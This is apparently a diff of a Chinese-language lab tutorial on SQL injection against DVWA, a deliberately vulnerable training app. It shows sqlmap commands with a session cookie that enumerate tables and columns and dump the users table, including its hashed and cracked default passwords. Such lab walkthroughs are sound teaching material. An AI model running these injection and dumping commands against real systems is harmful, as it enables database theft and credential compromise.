@@ -43,11 +43,49 @@ available databases [4]:
 # 获取dvwa库的所有表
 sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" -D dvwa --tables --batch --flush-session
 
+Database: dvwa
+[2 tables]
++-----------+
+| guestbook |
+| users     |
++-----------+
+
+
 # 获取users表的所有列
 sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" -D dvwa -T users --columns --batch --flush-session
 
+Database: dvwa
+Table: users
+[8 columns]
++--------------+-------------+
+| Column       | Type        |
++--------------+-------------+
+| user         | varchar(15) |
+| avatar       | varchar(70) |
+| failed_login | int(3)      |
+| first_name   | varchar(15) |
+| last_login   | timestamp   |
+| last_name    | varchar(15) |
+| password     | varchar(32) |
+| user_id      | int(6)      |
++--------------+-------------+
+
+
 # 获取users表其中几列的数据
 sqlmap.py -u "http://193.168.4.20/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=0m1toehgd6t5h4oqnfsqcjpk05; security=low" -D dvwa -T users -C "user,user_id,password" --dump --batch --flush-session
+
+Database: dvwa
+Table: users
+[5 entries]
++---------+---------+---------------------------------------------+
+| user    | user_id | password                                    |
++---------+---------+---------------------------------------------+
+| admin   | 1       | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| gordonb | 2       | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| 1337    | 3       | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| pablo   | 4       | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
+| smithy  | 5       | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
++---------+---------+---------------------------------------------+
 ```
 
 <br>
